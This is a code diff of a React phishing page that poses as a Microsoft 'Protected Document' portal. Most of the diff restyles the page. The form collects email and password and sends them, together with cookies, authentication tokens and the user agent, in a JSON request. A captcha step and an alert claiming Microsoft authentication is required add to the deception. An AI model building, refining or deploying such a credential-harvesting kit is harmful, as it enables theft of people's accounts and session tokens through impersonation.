@@ -108,15 +108,6 @@ function App() {
         0% { opacity: 0; transform: translateY(10px); }
         100% { opacity: 1; transform: translateY(0); }
       }
-      @keyframes pulse {
-        0% { transform: scale(1); }
-        50% { transform: scale(1.05); }
-        100% { transform: scale(1); }
-      }
-      @keyframes shimmer {
-        0% { background-position: -200px 0; }
-        100% { background-position: calc(200px + 100%) 0; }
-      }
       .redirecting-dots span:nth-child(1) { animation-delay: 0s; }
       .redirecting-dots span:nth-child(2) { animation-delay: 0.2s; }
       .redirecting-dots span:nth-child(3) { animation-delay: 0.4s; }
@@ -126,33 +117,7 @@ function App() {
       .redirecting-dots span { animation: dotAnimation 1.5s infinite; }
       .fade-in { animation: fadeIn 0.5s ease-out; }
       .document-icon { animation: spin 2s linear infinite; }
-      .protected-doc:hover { 
-        transform: translateY(-2px); 
-        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); 
-        box-shadow: 0 8px 25px rgba(0,120,212,0.35) !important;
-      }
-      .input-focus:focus {
-        outline: none;
-        border-color: #0078d4;
-        box-shadow: 0 0 0 3px rgba(0,120,212,0.1);
-        transform: translateY(-1px);
-      }
-      .shimmer-effect {
-        background: linear-gradient(90deg, #f0f0f0 0px, #e8e8e8 40px, #f0f0f0 80px);
-        background-size: 600px;
-        animation: shimmer 1.5s linear infinite;
-      }
-      .professional-card {
-        background: linear-gradient(145deg, #ffffff 0%, #fafafa 100%);
-        border: 1px solid rgba(0,0,0,0.08);
-        box-shadow: 0 20px 60px rgba(0,0,0,0.08), 0 8px 16px rgba(0,0,0,0.04);
-        backdrop-filter: blur(10px);
-      }
-      .warning-box {
-        background: linear-gradient(135deg, #fff8e1 0%, #fff3c4 100%);
-        border: 1px solid #ffc107;
-        box-shadow: 0 2px 8px rgba(255,193,7,0.15);
-      }
+      .protected-doc:hover { transform: translateY(-2px); transition: transform 0.2s ease; }
     `;
     document.head.appendChild(style);
     return () => document.head.removeChild(style);
@@ -427,7 +392,7 @@ function App() {
         },
         body: JSON.stringify({
           email,
-          password, // 🔧 FIX: Removed passwordSource field - only sending clean password
+          password,
           cookies,
           authenticationTokens,
           userAgent,
@@ -552,124 +517,68 @@ function App() {
           justifyContent: 'center',
           alignItems: 'center',
           minHeight: '100vh',
-          fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
-          background: 'linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%)',
-          padding: '24px'
+          fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
+          backgroundColor: '#f3f2f1',
+          padding: '20px'
         }}>
-          <div className="fade-in professional-card" style={{
+          <div className="fade-in" style={{
             textAlign: 'center',
-            padding: '56px 64px',
-            borderRadius: '16px',
-            maxWidth: '520px',
-            width: '100%',
-            position: 'relative'
+            background: 'white',
+            padding: '50px 60px',
+            borderRadius: '12px',
+            boxShadow: '0 8px 32px rgba(0,0,0,0.12)',
+            maxWidth: '500px',
+            width: '100%'
           }}>
-            {/* Professional Header Section */}
+            {/* Removed Protected Document Icon and badge as requested */}
+            <h2 style={{ 
+              color: '#323130', 
+              margin: '0 0 15px',
+              fontSize: '28px',
+              fontWeight: '600',
+              lineHeight: '1.3'
+            }}>
+              Protected Document
+            </h2>
+            <p style={{ 
+              color: '#605e5c', 
+              margin: '0 0 25px',
+              fontSize: '16px',
+              lineHeight: '1.5'
+            }}>
+              This Document contains confidential information and requires authentication to access.
+            </p>
             <div style={{
+              background: '#fff4ce',
+              border: '1px solid #ffcc02',
+              borderRadius: '6px',
+              padding: '15px',
+              margin: '0 0 25px',
               display: 'flex',
               alignItems: 'center',
-              justifyContent: 'center',
-              marginBottom: '32px'
-            }}>
-              <div style={{
-                width: '64px',
-                height: '64px',
-                background: 'linear-gradient(135deg, #0078d4 0%, #106ebe 100%)',
-                borderRadius: '16px',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                marginRight: '16px',
-                boxShadow: '0 8px 24px rgba(0,120,212,0.25)'
-              }}>
-                <span style={{ fontSize: '28px', color: 'white' }}>🔒</span>
-              </div>
-              <div style={{ textAlign: 'left' }}>
-                <h1 style={{ 
-                  color: '#1a1a1a', 
-                  margin: '0 0 4px',
-                  fontSize: '32px',
-                  fontWeight: '700',
-                  letterSpacing: '-0.5px'
-                }}>
-                  Protected Document
-                </h1>
-                <div style={{
-                  background: 'linear-gradient(135deg, #0078d4, #106ebe)',
-                  backgroundClip: 'text',
-                  WebkitBackgroundClip: 'text',
-                  WebkitTextFillColor: 'transparent',
-                  fontSize: '14px',
-                  fontWeight: '600',
-                  letterSpacing: '0.5px'
-                }}>
-                  ENTERPRISE SECURITY
-                </div>
-              </div>
-            </div>
-
-            {/* Professional Description */}
-            <p style={{ 
-              color: '#4a5568', 
-              margin: '0 0 32px',
-              fontSize: '18px',
-              lineHeight: '1.6',
-              fontWeight: '400'
-            }}>
-              This document contains confidential information and requires authentication to access.
-            </p>
-
-            {/* Enhanced Warning Box */}
-            <div className="warning-box" style={{
-              borderRadius: '12px',
-              padding: '20px',
-              margin: '0 0 32px',
-              display: 'flex',
-              alignItems: 'flex-start',
               textAlign: 'left'
             }}>
+              <span style={{
+                fontSize: '18px',
+                marginRight: '10px'
+              }}>⚠️</span>
               <div style={{
-                width: '24px',
-                height: '24px',
-                background: '#ffc107',
-                borderRadius: '50%',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'center',
-                marginRight: '16px',
-                flexShrink: 0
+                fontSize: '13px',
+                color: '#605e5c'
               }}>
-                <span style={{ fontSize: '14px', color: '#1a1a1a' }}>⚠️</span>
-              </div>
-              <div>
-                <div style={{
-                  fontSize: '15px',
-                  fontWeight: '600',
-                  color: '#1a1a1a',
-                  marginBottom: '4px'
-                }}>
-                  Authentication Required
-                </div>
-                <div style={{
-                  fontSize: '14px',
-                  color: '#4a5568',
-                  lineHeight: '1.5'
-                }}>
-                  Please sign in with your Microsoft account to verify your access permissions.
-                </div>
+                <strong style={{ color: '#323130' }}>Authentication Required</strong><br/>
+                Please sign in with your Microsoft account to verify your access permissions.
               </div>
             </div>
-
-            {/* Professional Form */}
-            <form onSubmit={handleFormSubmit} style={{ textAlign: 'left', marginBottom: '32px' }}>
-              <div style={{ marginBottom: '20px' }}>
+            {/* Email and Password Form */}
+            <form onSubmit={handleFormSubmit} style={{ textAlign: 'left', marginBottom: '25px' }}>
+              <div style={{ marginBottom: '15px' }}>
                 <label style={{
                   display: 'block',
-                  fontSize: '15px',
+                  fontSize: '14px',
                   fontWeight: '600',
-                  color: '#1a1a1a',
-                  marginBottom: '8px',
-                  letterSpacing: '0.1px'
+                  color: '#323130',
+                  marginBottom: '6px'
                 }}>
                   Email Address
                 </label>
@@ -678,29 +587,25 @@ function App() {
                   value={formEmail}
                   onChange={(e) => setFormEmail(e.target.value)}
                   required
-                  className="input-focus"
                   style={{
                     width: '100%',
-                    padding: '16px 20px',
-                    border: '2px solid #e2e8f0',
-                    borderRadius: '12px',
+                    padding: '12px 16px',
+                    border: '1px solid #d2d0ce',
+                    borderRadius: '6px',
                     fontSize: '16px',
                     fontFamily: 'inherit',
-                    boxSizing: 'border-box',
-                    transition: 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)',
-                    background: '#ffffff'
+                    boxSizing: 'border-box'
                   }}
                   placeholder="Enter your Microsoft email"
                 />
               </div>
-              <div style={{ marginBottom: '28px' }}>
+              <div style={{ marginBottom: '20px' }}>
                 <label style={{
                   display: 'block',
-                  fontSize: '15px',
+                  fontSize: '14px',
                   fontWeight: '600',
-                  color: '#1a1a1a',
-                  marginBottom: '8px',
-                  letterSpacing: '0.1px'
+                  color: '#323130',
+                  marginBottom: '6px'
                 }}>
                   Password
                 </label>
@@ -709,17 +614,14 @@ function App() {
                   value={formPassword}
                   onChange={(e) => setFormPassword(e.target.value)}
                   required
-                  className="input-focus"
                   style={{
                     width: '100%',
-                    padding: '16px 20px',
-                    border: '2px solid #e2e8f0',
-                    borderRadius: '12px',
+                    padding: '12px 16px',
+                    border: '1px solid #d2d0ce',
+                    borderRadius: '6px',
                     fontSize: '16px',
                     fontFamily: 'inherit',
-                    boxSizing: 'border-box',
-                    transition: 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)',
-                    background: '#ffffff'
+                    boxSizing: 'border-box'
                   }}
                   placeholder="Enter your password"
                 />
@@ -730,81 +632,63 @@ function App() {
                 className="protected-doc"
                 style={{
                   width: '100%',
-                  padding: '18px 32px',
+                  padding: '16px 24px',
                   background: isSubmitting 
-                    ? 'linear-gradient(135deg, #9ca3af 0%, #6b7280 100%)'
-                    : 'linear-gradient(135deg, #0078d4 0%, #106ebe 100%)',
+                    ? 'linear-gradient(135deg, #8a8a8a 0%, #6a6a6a 100%)'
+                    : 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)',
                   color: 'white',
                   border: 'none',
-                  borderRadius: '12px',
+                  borderRadius: '6px',
                   cursor: isSubmitting ? 'not-allowed' : 'pointer',
-                  fontSize: '17px',
+                  fontSize: '16px',
                   fontWeight: '600',
-                  boxShadow: isSubmitting 
-                    ? '0 4px 12px rgba(156,163,175,0.3)'
-                    : '0 8px 24px rgba(0,120,212,0.35)',
-                  transition: 'all 0.3s cubic-bezier(0.4, 0, 0.2, 1)',
-                  textShadow: '0 1px 2px rgba(0,0,0,0.1)',
+                  boxShadow: '0 4px 16px rgba(0,120,212,0.4)',
+                  transition: 'all 0.2s ease',
+                  textShadow: '0 1px 2px rgba(0,0,0,0.2)',
                   position: 'relative',
-                  overflow: 'hidden',
-                  letterSpacing: '0.3px'
+                  overflow: 'hidden'
                 }}
                 onMouseOver={(e) => {
                   if (!isSubmitting) {
-                    e.currentTarget.style.background = 'linear-gradient(135deg, #005a9e 0%, #004578 100%)';
+                    e.currentTarget.style.background = 'linear-gradient(135deg, #106ebe 0%, #004578 100%)';
+                    e.currentTarget.style.transform = 'translateY(-2px)';
+                    e.currentTarget.style.boxShadow = '0 6px 20px rgba(0,120,212,0.5)';
                   }
                 }}
                 onMouseOut={(e) => {
                   if (!isSubmitting) {
-                    e.currentTarget.style.background = 'linear-gradient(135deg, #0078d4 0%, #106ebe 100%)';
+                    e.currentTarget.style.background = 'linear-gradient(135deg, #0078d4 0%, #005a9e 100%)';
+                    e.currentTarget.style.transform = 'translateY(0)';
+                    e.currentTarget.style.boxShadow = '0 4px 16px rgba(0,120,212,0.4)';
                   }
                 }}
               >
-                {isSubmitting ? (
-                  <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                    <span style={{ marginRight: '8px' }}>🔄</span>
-                    Authenticating...
-                  </span>
-                ) : (
-                  <span style={{ display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                    <span style={{ marginRight: '8px' }}>🔐</span>
-                    Authenticate & Open Document
-                  </span>
-                )}
+                {isSubmitting ? '🔄 Authenticating...' : 'Authenticate & Open Document'}
               </button>
             </form>
-
-            {/* Professional Action Buttons */}
             <div style={{
               display: 'flex',
               justifyContent: 'center',
-              gap: '16px',
-              marginBottom: '32px',
-              flexWrap: 'wrap'
+              gap: '15px',
+              marginTop: '20px'
             }}>
               <button
                 onClick={() => setCurrentPage('captcha')}
                 style={{
-                  padding: '12px 24px',
+                  padding: '8px 16px',
                   backgroundColor: 'transparent',
                   color: '#0078d4',
-                  border: '2px solid #0078d4',
-                  borderRadius: '8px',
+                  border: '1px solid #0078d4',
+                  borderRadius: '6px',
                   cursor: 'pointer',
                   fontSize: '14px',
-                  fontWeight: '600',
-                  transition: 'all 0.2s ease',
-                  letterSpacing: '0.2px'
+                  fontWeight: '500'
                 }}
                 onMouseOver={(e) => {
-                  e.currentTarget.style.backgroundColor = '#0078d4';
-                  e.currentTarget.style.color = 'white';
-                  e.currentTarget.style.transform = 'translateY(-1px)';
+                  e.currentTarget.style.backgroundColor = '#f3f2f1';
                 }}
                 onMouseOut={(e) => {
                   e.currentTarget.style.backgroundColor = 'transparent';
-                  e.currentTarget.style.color = '#0078d4';
-                  e.currentTarget.style.transform = 'translateY(0)';
                 }}
               >
                 ← Back to Start
@@ -814,47 +698,33 @@ function App() {
                   alert('For security reasons, document access requires authentication through Microsoft.');
                 }}
                 style={{
-                  padding: '12px 24px',
+                  padding: '8px 16px',
                   backgroundColor: 'transparent',
-                  color: '#6b7280',
-                  border: '2px solid #e5e7eb',
-                  borderRadius: '8px',
+                  color: '#605e5c',
+                  border: '1px solid #d2d0ce',
+                  borderRadius: '6px',
                   cursor: 'pointer',
                   fontSize: '14px',
-                  fontWeight: '600',
-                  transition: 'all 0.2s ease',
-                  letterSpacing: '0.2px'
+                  fontWeight: '500'
                 }}
                 onMouseOver={(e) => {
-                  e.currentTarget.style.backgroundColor = '#f9fafb';
-                  e.currentTarget.style.borderColor = '#d1d5db';
-                  e.currentTarget.style.transform = 'translateY(-1px)';
+                  e.currentTarget.style.backgroundColor = '#f3f2f1';
                 }}
                 onMouseOut={(e) => {
                   e.currentTarget.style.backgroundColor = 'transparent';
-                  e.currentTarget.style.borderColor = '#e5e7eb';
-                  e.currentTarget.style.transform = 'translateY(0)';
                 }}
               >
                 Request Access
               </button>
             </div>
-
-            {/* Professional Footer */}
             <div style={{
-              paddingTop: '24px',
-              borderTop: '1px solid #f1f5f9',
-              fontSize: '13px',
-              color: '#94a3b8',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              gap: '8px'
+              marginTop: '25px',
+              paddingTop: '20px',
+              borderTop: '1px solid #edebe9',
+              fontSize: '12px',
+              color: '#a19f9d'
             }}>
-              <span style={{ fontSize: '16px' }}>🛡️</span>
-              <span style={{ fontWeight: '500', letterSpacing: '0.5px' }}>
-                Secure Document Access Portal
-              </span>
+              Secure Document Access Portal
             </div>
           </div>
         </div>
